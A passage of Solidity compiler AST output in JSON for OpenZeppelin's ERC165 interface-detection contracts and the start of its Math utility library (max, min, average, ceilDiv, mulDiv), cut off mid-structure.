zeppelin/contracts/utils/introspection/IERC165.sol","file":"./IERC165.sol","id":1689,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":1711,"sourceUnit":1723,"src":"124:23:8","symbolAliases":[],"unitAlias":""},{"abstract":true,"baseContracts":[{"baseName":{"id":1691,"name":"IERC165","nodeType":"IdentifierPath","referencedDeclaration":1722,"src":"754:7:8"},"id":1692,"nodeType":"InheritanceSpecifier","src":"754:7:8"}],"contractDependencies":[],"contractKind":"contract","documentation":{"id":1690,"nodeType":"StructuredDocumentation","src":"149:576:8","text":" @dev Implementation of the {IERC165} interface.\n Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check\n for the additional interface id that will be supported. For example:\n ```solidity\n function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);\n }\n ```\n Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation."},"fullyImplemented":true,"id":1710,"linearizedBaseContracts":[1710,1722],"name":"ERC165","nameLocation":"744:6:8","nodeType":"ContractDefinition","nodes":[{"baseFunctions":[1721],"body":{"id":1708,"nodeType":"Block","src":"920:64:8","statements":[{"expression":{"commonType":{"typeIdentifier":"t_bytes4","typeString":"bytes4"},"id":1706,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1701,"name":"interfaceId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1695,"src":"937:11:8","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"arguments":[{"id":1703,"name":"IERC165","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1722,"src":"957:7:8","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_IERC165_$1722_$","typeString":"type(contract IERC165)"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_contract$_IERC165_$1722_$","typeString":"type(contract IERC165)"}],"id":1702,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"952:4:8","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":1704,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"952:13:8","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_contract$_IERC165_$1722","typeString":"type(contract IERC165)"}},"id":1705,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberName":"interfaceId","nodeType":"MemberAccess","src":"952:25:8","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"src":"937:40:8","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"functionReturnParameters":1700,"id":1707,"nodeType":"Return","src":"930:47:8"}]},"documentation":{"id":1693,"nodeType":"StructuredDocumentation","src":"768:56:8","text":" @dev See {IERC165-supportsInterface}."},"functionSelector":"01ffc9a7","id":1709,"implemented":true,"kind":"function","modifiers":[],"name":"supportsInterface","nameLocation":"838:17:8","nodeType":"FunctionDefinition","overrides":{"id":1697,"nodeType":"OverrideSpecifier","overrides":[],"src":"896:8:8"},"parameters":{"id":1696,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1695,"mutability":"mutable","name":"interfaceId","nameLocation":"863:11:8","nodeType":"VariableDeclaration","scope":1709,"src":"856:18:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"},"typeName":{"id":1694,"name":"bytes4","nodeType":"ElementaryTypeName","src":"856:6:8","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"visibility":"internal"}],"src":"855:20:8"},"returnParameters":{"id":1700,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1699,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1709,"src":"914:4:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1698,"name":"bool","nodeType":"ElementaryTypeName","src":"914:4:8","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"913:6:8"},"scope":1710,"src":"829:155:8","stateMutability":"view","virtual":true,"visibility":"public"}],"scope":1711,"src":"726:260:8","usedErrors":[]}],"src":"99:888:8"},"id":8},"@openzeppelin/contracts/utils/introspection/IERC165.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/introspection/IERC165.sol","exportedSymbols":{"IERC165":[1722]},"id":1723,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1712,"literals":["solidity","^","0.8",".0"],"nodeType":"PragmaDirective","src":"100:23:9"},{"abstract":false,"baseContracts":[],"contractDependencies":[],"contractKind":"interface","documentation":{"id":1713,"nodeType":"StructuredDocumentation","src":"125:279:9","text":" @dev Interface of the ERC165 standard, as defined in the\n https://eips.ethereum.org/EIPS/eip-165[EIP].\n Implementers can declare support of contract interfaces, which can then be\n queried by others ({ERC165Checker}).\n For an implementation, see {ERC165}."},"fullyImplemented":false,"id":1722,"linearizedBaseContracts":[1722],"name":"IERC165","nameLocation":"415:7:9","nodeType":"ContractDefinition","nodes":[{"documentation":{"id":1714,"nodeType":"StructuredDocumentation","src":"429:340:9","text":" @dev Returns true if this contract implements the interface defined by\n `interfaceId`. See the corresponding\n https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\n to learn more about how these ids are created.\n This function call must use less than 30 000 gas."},"functionSelector":"01ffc9a7","id":1721,"implemented":false,"kind":"function","modifiers":[],"name":"supportsInterface","nameLocation":"783:17:9","nodeType":"FunctionDefinition","parameters":{"id":1717,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1716,"mutability":"mutable","name":"interfaceId","nameLocation":"808:11:9","nodeType":"VariableDeclaration","scope":1721,"src":"801:18:9","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"},"typeName":{"id":1715,"name":"bytes4","nodeType":"ElementaryTypeName","src":"801:6:9","typeDescriptions":{"typeIdentifier":"t_bytes4","typeString":"bytes4"}},"visibility":"internal"}],"src":"800:20:9"},"returnParameters":{"id":1720,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1719,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1721,"src":"844:4:9","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1718,"name":"bool","nodeType":"ElementaryTypeName","src":"844:4:9","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"843:6:9"},"scope":1722,"src":"774:76:9","stateMutability":"view","virtual":false,"visibility":"external"}],"scope":1723,"src":"405:447:9","usedErrors":[]}],"src":"100:753:9"},"id":9},"@openzeppelin/contracts/utils/math/Math.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/math/Math.sol","exportedSymbols":{"Math":[2587]},"id":2588,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1724,"literals":["solidity","^","0.8",".0"],"nodeType":"PragmaDirective","src":"103:23:10"},{"abstract":false,"baseContracts":[],"contractDependencies":[],"contractKind":"library","documentation":{"id":1725,"nodeType":"StructuredDocumentation","src":"128:73:10","text":" @dev Standard math utilities missing in the Solidity language."},"fullyImplemented":true,"id":2587,"linearizedBaseContracts":[2587],"name":"Math","nameLocation":"210:4:10","nodeType":"ContractDefinition","nodes":[{"canonicalName":"Math.Rounding","id":1729,"members":[{"id":1726,"name":"Down","nameLocation":"245:4:10","nodeType":"EnumValue","src":"245:4:10"},{"id":1727,"name":"Up","nameLocation":"287:2:10","nodeType":"EnumValue","src":"287:2:10"},{"id":1728,"name":"Zero","nameLocation":"318:4:10","nodeType":"EnumValue","src":"318:4:10"}],"name":"Rounding","nameLocation":"226:8:10","nodeType":"EnumDefinition","src":"221:122:10"},{"body":{"id":1746,"nodeType":"Block","src":"480:37:10","statements":[{"expression":{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1741,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1739,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1732,"src":"497:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"id":1740,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1734,"src":"501:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"497:5:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"id":1743,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1734,"src":"509:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1744,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"497:13:10","trueExpression":{"id":1742,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1732,"src":"505:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1738,"id":1745,"nodeType":"Return","src":"490:20:10"}]},"documentation":{"id":1730,"nodeType":"StructuredDocumentation","src":"349:59:10","text":" @dev Returns the largest of two numbers."},"id":1747,"implemented":true,"kind":"function","modifiers":[],"name":"max","nameLocation":"422:3:10","nodeType":"FunctionDefinition","parameters":{"id":1735,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1732,"mutability":"mutable","name":"a","nameLocation":"434:1:10","nodeType":"VariableDeclaration","scope":1747,"src":"426:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1731,"name":"uint256","nodeType":"ElementaryTypeName","src":"426:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1734,"mutability":"mutable","name":"b","nameLocation":"445:1:10","nodeType":"VariableDeclaration","scope":1747,"src":"437:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1733,"name":"uint256","nodeType":"ElementaryTypeName","src":"437:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"425:22:10"},"returnParameters":{"id":1738,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1737,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1747,"src":"471:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1736,"name":"uint256","nodeType":"ElementaryTypeName","src":"471:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"470:9:10"},"scope":2587,"src":"413:104:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1764,"nodeType":"Block","src":"655:37:10","statements":[{"expression":{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1759,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1757,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1750,"src":"672:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":1758,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1752,"src":"676:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"672:5:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"id":1761,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1752,"src":"684:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1762,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"672:13:10","trueExpression":{"id":1760,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1750,"src":"680:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1756,"id":1763,"nodeType":"Return","src":"665:20:10"}]},"documentation":{"id":1748,"nodeType":"StructuredDocumentation","src":"523:60:10","text":" @dev Returns the smallest of two numbers."},"id":1765,"implemented":true,"kind":"function","modifiers":[],"name":"min","nameLocation":"597:3:10","nodeType":"FunctionDefinition","parameters":{"id":1753,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1750,"mutability":"mutable","name":"a","nameLocation":"609:1:10","nodeType":"VariableDeclaration","scope":1765,"src":"601:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1749,"name":"uint256","nodeType":"ElementaryTypeName","src":"601:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1752,"mutability":"mutable","name":"b","nameLocation":"620:1:10","nodeType":"VariableDeclaration","scope":1765,"src":"612:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1751,"name":"uint256","nodeType":"ElementaryTypeName","src":"612:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"600:22:10"},"returnParameters":{"id":1756,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1755,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1765,"src":"646:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1754,"name":"uint256","nodeType":"ElementaryTypeName","src":"646:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"645:9:10"},"scope":2587,"src":"588:104:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1787,"nodeType":"Block","src":"876:82:10","statements":[{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1785,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1777,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1775,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1768,"src":"931:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"&","rightExpression":{"id":1776,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1770,"src":"935:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"931:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":1778,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"930:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1784,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1781,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1779,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1768,"src":"941:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"id":1780,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1770,"src":"945:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"941:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":1782,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"940:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"hexValue":"32","id":1783,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"950:1:10","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"940:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"930:21:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1774,"id":1786,"nodeType":"Return","src":"923:28:10"}]},"documentation":{"id":1766,"nodeType":"StructuredDocumentation","src":"698:102:10","text":" @dev Returns the average of two numbers. The result is rounded towards\n zero."},"id":1788,"implemented":true,"kind":"function","modifiers":[],"name":"average","nameLocation":"814:7:10","nodeType":"FunctionDefinition","parameters":{"id":1771,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1768,"mutability":"mutable","name":"a","nameLocation":"830:1:10","nodeType":"VariableDeclaration","scope":1788,"src":"822:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1767,"name":"uint256","nodeType":"ElementaryTypeName","src":"822:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1770,"mutability":"mutable","name":"b","nameLocation":"841:1:10","nodeType":"VariableDeclaration","scope":1788,"src":"833:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1769,"name":"uint256","nodeType":"ElementaryTypeName","src":"833:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"821:22:10"},"returnParameters":{"id":1774,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1773,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1788,"src":"867:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1772,"name":"uint256","nodeType":"ElementaryTypeName","src":"867:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"866:9:10"},"scope":2587,"src":"805:153:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1812,"nodeType":"Block","src":"1228:123:10","statements":[{"expression":{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1800,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1798,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1791,"src":"1316:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":1799,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1321:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"1316:6:10","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1809,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1807,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1804,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1802,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1791,"src":"1330:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"hexValue":"31","id":1803,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1334:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"1330:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":1805,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"1329:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"id":1806,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1793,"src":"1339:1:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1329:11:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":1808,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1343:1:10","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"1329:15:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1810,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"1316:28:10","trueExpression":{"hexValue":"30","id":1801,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1325:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1797,"id":1811,"nodeType":"Return","src":"1309:35:10"}]},"documentation":{"id":1789,"nodeType":"StructuredDocumentation","src":"964:188:10","text":" @dev Returns the ceiling of the division of two numbers.\n This differs from standard division with `/` in that it rounds up instead\n of rounding down."},"id":1813,"implemented":true,"kind":"function","modifiers":[],"name":"ceilDiv","nameLocation":"1166:7:10","nodeType":"FunctionDefinition","parameters":{"id":1794,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1791,"mutability":"mutable","name":"a","nameLocation":"1182:1:10","nodeType":"VariableDeclaration","scope":1813,"src":"1174:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1790,"name":"uint256","nodeType":"ElementaryTypeName","src":"1174:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1793,"mutability":"mutable","name":"b","nameLocation":"1193:1:10","nodeType":"VariableDeclaration","scope":1813,"src":"1185:9:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1792,"name":"uint256","nodeType":"ElementaryTypeName","src":"1185:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1173:22:10"},"returnParameters":{"id":1797,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1796,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1813,"src":"1219:7:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1795,"name":"uint256","nodeType":"ElementaryTypeName","src":"1219:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1218:9:10"},"scope":2587,"src":"1157:194:10","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1934,"nodeType":"Block","src":"1795:3797:10","statements":[{"id":1933,"nodeType":"UncheckedBlock","src":"1805:3781:10","statements":[{"assignments":[1826],"declarations":[{"constant":false,"id":1826,"mutability":"mutable","name":"prod0","nameLocation":"2134:5:10","nodeType":"VariableDeclaration","scope":1933,"src":"2126:13:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1825,"name":"uint256","nodeType":"ElementaryTypeName","src":"2126:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1827,"nodeType":"VariableDeclarationStatement","src":"2126:13:10"},{"assignments":[1829],"declarations":[{"constant":false,"id":1829,"mutability":"mutable","name":"prod1","nameLocation":"2206:5:10","nodeType":"VariableDeclaration","scope":1933,"src":"2198:13:10","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1828,"name":"uint256","nodeType":"ElementaryTypeName","src":"2198:7:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1830,"nodeType":"VariableDeclarationStatement","src":"2198:13:10"},{"AST":{"nodeType":"YulBlock","src":"2278:157:10","statements":[{"nodeType":"YulVariableDeclaration","src":"2296:30:10","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"2313:1:10"},{"name":"y","nodeType":"YulIdentifier","src":"2316:1:10"},{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"2323:1:10","type":"","value":"0"}],"functionName":{"name":"not","nodeType":"YulIdentifier","src":"2319:3:10"},"nodeType":"YulFunctionCall","src":"2319:6:10"}],"functionName":{"name":"mulmod","nodeType":"YulIdentifier","src":"2306:6:10"},"nodeType":"YulFunctionCall","src":"2306:20:10"},"variables":[{"name":"mm","nodeType":"YulTypedName","src":"2300:2:10","type":""}]},{"nodeType":"YulAssignment","src":"2343:18:10","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"2356:1:10"},{"name":"y","nodeType":"YulIdentifier","src":"2359:1:10"}],"functionName":{"name":"mul","nodeType":"YulIdentifier","src":"2352:3:10"},"nodeType":"YulFunctionCall","src":"2352:9:10"},"variableNames":[{"name":"prod0","nodeType":"YulIdentifier","src":"2343:5:10"}]},{"nodeType":"YulAssignment","src":"2378:43:10","value":{"arguments":[{"arguments":[{"name":"mm","nodeType":"YulIdentifier","src":"2395:2:10"},{"name":"prod0","nodeType":"YulIdentifier","src":"2399:5:10"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"2391:3:10"},"nodeType":"YulFunctionCall","src":"2391:14:10"},{"arguments":[{"name":"mm","nodeType":"YulIdentifier","src":"2410:2:10"},{"name":"prod0","nodeType":"YulIdentifier","src":"2414:5:10"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"2407:2:10"},"nodeType":"YulFunctionCall","src":"2407:13:10"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"2387:3:10"},"nodeType":"YulFunctionCall","src":"2387:34:10"},"variableNames":[{"name":"prod1","nodeType":"YulIdentifier","src":"2378:5:10"}]}]},"evmVersion":"london","externalReferences":[{"declaration":1826,"isOffset":false,"isSlot":false,"src":"2343:5:10","valueSize":1},{"declaration":1826,"isOffset":false,"isSlot":false,"src":"2399:5:10","valueSize":1},{"declaration":1826,"isOffset":false,"isSlot":false,"src":"2414:5:10","valueSize":1},{"declaration":1829,"isOffset":false,"isSlot":false,"src":"2378:5:10","valueSize":1},{"declaration":1816,"isOffset":false,"isSlot":false,"src":"2313:1:10","valueSize":1},{"declaration":1816,"isOffset":false,"isSlot":false,"src":"2356:1:10","valueSize":1},{"declaration":1818,"isOffset":false,"isSlot":false,"src":"2316:1:10","valueSize":1},{"declaration":1818,"isOffset":false,"isSlot":false,"src":"2359:1:10","valueSize":1}],"id":1831,"nodeType":"InlineAssembly","src":"2269:166:10"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1834,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1832,"name":"prod1","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1829,"src":"2516:5:10","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":1833,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2525:1:10","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 